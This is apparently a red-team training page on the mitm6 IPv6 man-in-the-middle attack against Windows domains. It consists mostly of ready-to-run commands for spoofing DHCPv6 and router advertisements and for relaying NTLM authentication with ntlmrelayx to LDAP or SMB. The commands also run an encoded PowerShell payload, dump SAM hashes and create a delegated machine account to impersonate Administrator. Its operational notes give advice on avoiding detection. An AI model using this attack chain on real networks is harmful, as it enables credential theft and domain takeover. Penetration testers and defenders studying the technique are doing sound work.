---
layout: training-page
title: "mitm6 — IPv6 MITM — Red Team Academy"
module: "Network Attacks"
tags:
  - mitm6
  - ipv6
  - dhcpv6
  - network
  - ntlm-relay
  - windows
page_key: "network-mitm6"
render_with_liquid: false
---

# mitm6 — IPv6 MITM

mitm6 exploits a fundamental Windows behavior: Windows prefers IPv6 over IPv4 by default on dual-stack networks. By spoofing DHCPv6 and acting as a rogue IPv6 router, mitm6 becomes the DNS server for Windows hosts on the segment — redirecting authentication attempts and enabling NTLM relay without needing to poison LLMNR or intercept ARP at all.

## Why It Works

```
1. Windows periodically sends DHCPv6 SOLICIT broadcasts (even if no IPv6 infra exists)
2. mitm6 responds with a DHCPv6 ADVERTISE and REPLY, assigning:
   - A link-local IPv6 address
   - Itself as the IPv6 DNS server
3. Windows now uses mitm6 for DNS resolution (IPv6 preferred over IPv4)
4. mitm6 intercepts DNS queries and responds with its own IPv6 address
5. Windows clients authenticate to mitm6 using NTLM
6. mitm6 relays the credentials with ntlmrelayx
```

## Prerequisites

```bash
# Check: are Windows hosts sending DHCPv6 SOLICITs?
tcpdump -i eth0 'ip6 and udp port 546'
# If you see traffic → mitm6 will work

# Check: is SMB signing disabled on targets? (for relay)
crackmapexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt
nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Check: is LDAP signing enforced?
ldap-signing check or check DC policy
# Not always required if targeting LDAPS or HTTP endpoints
```

## Running mitm6

```bash
# Install
pip3 install mitm6

# Basic — spoof DHCPv6 for all hosts on segment
mitm6 -i eth0 -d contoso.local

# Limit to specific hosts (reduces noise)
mitm6 -i eth0 -d contoso.local --mac AA:BB:CC:DD:EE:FF

# Ignore specific hosts (avoid disrupting critical systems)
mitm6 -i eth0 -d contoso.local --ignore-nofqdn

# Verbose
mitm6 -i eth0 -d contoso.local -v
```

## Combined Attack: mitm6 + ntlmrelayx

```bash
# Terminal 1: Run mitm6
mitm6 -i eth0 -d contoso.local

# Terminal 2: Run ntlmrelayx — relay captured auth to LDAP on DC
# This creates a new computer account and can dump LDAP data
ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh fakewpad.contoso.local \
  -l /tmp/loot --delegate-access

# Terminal 2 (alternative): relay to SMB for command execution
ntlmrelayx.py -6 -t smb://192.168.1.20 -wh fakewpad.contoso.local \
  -smb2support -c "powershell -enc BASE64PAYLOAD"

# Terminal 2 (alternative): relay to multiple targets
ntlmrelayx.py -6 -tf no_signing.txt -wh fakewpad.contoso.local \
  -smb2support --sam

# -6          = listen on IPv6
# -wh         = WPAD hostname to respond to (mitm6 will resolve this to itself)
# -l          = dump LDAP output to directory
# --delegate-access = create machine account with delegation rights
```

## WPAD + NTLM Relay Flow

```
Victim opens browser
  │
  ▼
Browser queries: http://fakewpad.contoso.local/wpad.dat
  │
  ▼
mitm6 resolved fakewpad.contoso.local → attacker IPv6
  │
  ▼
ntlmrelayx serves the WPAD response — forces NTLM auth
  │
  ▼
Victim sends Net-NTLMv2 to ntlmrelayx
  │
  ▼
ntlmrelayx relays to DC LDAP / SMB target
  │
  ▼
If admin: SAM dump, new computer account, command execution
```

## LDAP Relay — Creating a Computer Account

```bash
# When a domain user's credentials are relayed to LDAP:
# ntlmrelayx creates a computer account (MachineAccount$) with a known password
# and sets Resource-Based Constrained Delegation (RBCD)
# This allows impersonating any user to the victim machine via S4U2Self

# After ntlmrelayx creates the account:
# 1. Get TGT for the new machine account
impacket-getTGT contoso.local/NEWMACHINE\$ -hashes :NThash

# 2. Impersonate Administrator via S4U2Proxy
impacket-getST -spn cifs/VICTIMPC.contoso.local \
  -impersonate Administrator \
  contoso.local/NEWMACHINE\$ -hashes :NThash

# 3. Use the service ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass VICTIMPC.contoso.local
```

## IPv6 Rogue Router Advertisement

```bash
# Alternative to DHCPv6: send Router Advertisements to set default IPv6 gateway
# Works even without DHCPv6 — targets SLAAC (Stateless Address Autoconfiguration)

# Using scapy:
python3 -c "
from scapy.all import *
ra = IPv6(dst='ff02::1')/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix='2001:db8::/64')
sendp(Ether(dst='33:33:00:00:00:01')/ra, iface='eth0', loop=1, inter=5)
"

# Using radvd or fake_router6 (thc-ipv6 toolkit)
fake_router6 eth0 2001:db8::/64
```

## Operational Notes

```
# mitm6 is disruptive — it intercepts DHCPv6 for the entire subnet
# Run for limited time windows (30-60 minutes) to avoid detection
# The -d flag limits impact to a single domain

# Stop cleanly — Windows will recover IPv4 DNS after mitm6 stops
# Kill mitm6 → Windows DHCPv6 lease expires → IPv4 DNS resumes

# Best results:
# - Run during business hours when users are active (browser traffic = WPAD)
# - Target DCs and SQL servers in ntlmrelayx -t (high value, often no signing)
# - Combine with Bloodhound to identify delegation paths after getting computer acct
```

## Resources

- mitm6 — `github.com/dirkjanm/mitm6`
- mitm6 blog post (dirkjanm) — `dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/`
- Impacket ntlmrelayx — `github.com/fortra/impacket`
- MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
